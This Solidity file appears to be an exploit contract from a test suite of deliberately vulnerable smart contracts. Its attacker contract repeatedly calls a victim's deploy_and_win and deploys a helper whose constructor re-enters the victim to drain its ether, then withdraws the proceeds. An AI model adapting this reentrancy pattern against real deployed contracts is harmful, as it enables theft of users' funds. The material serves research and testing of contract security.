// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../cross-contract/create/Create_ree2.sol";

contract Create_ree2_Attacker {
    bytes private create_auxharmless_initcode;
    bytes private create_auxharmful_initcode;
    Create_ree2 private victim;
    uint public stackCount;
    bool public flag;

    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
    constructor(address payable _victim) {
        victim = Create_ree2(_victim);
    }

    function attack() public payable {
        flag = true;
        while (flag) {
            // attack only every 10 instances, i.e. when some money is transfered
            if ((victim.counters(address(this)) + 1) % 10 == 0) {
                stackCount++;
                flag = false;
                bytes memory contractCode = abi.encodePacked(
                    type(Create_ree2_AttackerAux2).creationCode,
                    abi.encode(address(this))
                );
                victim.deploy_and_win{value: 1 ether}(
                    contractCode,
                    payable(address(this))
                );
            } else {
                victim.deploy_and_win{value: 1 ether}(
                    type(CreateRee2AttackerAux1).creationCode,
                    payable(address(this))
                );
            }
        }
    }

    function attackStep2() public {
        if (address(victim).balance >= 1 ether && stackCount < 50) {
            stackCount++;
            bytes memory contractCode = abi.encodePacked(
                type(Create_ree2_AttackerAux2).creationCode,
                abi.encode(address(this))
            );
            victim.deploy_and_win{value: 1 ether}(
                contractCode,
                payable(address(this))
            );
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract CreateRee2AttackerAux1 {
    constructor() {}
}

contract Create_ree2_AttackerAux2 {
    constructor(address payable attacker) {
        Create_ree2_Attacker(attacker).attackStep2();
    }
}
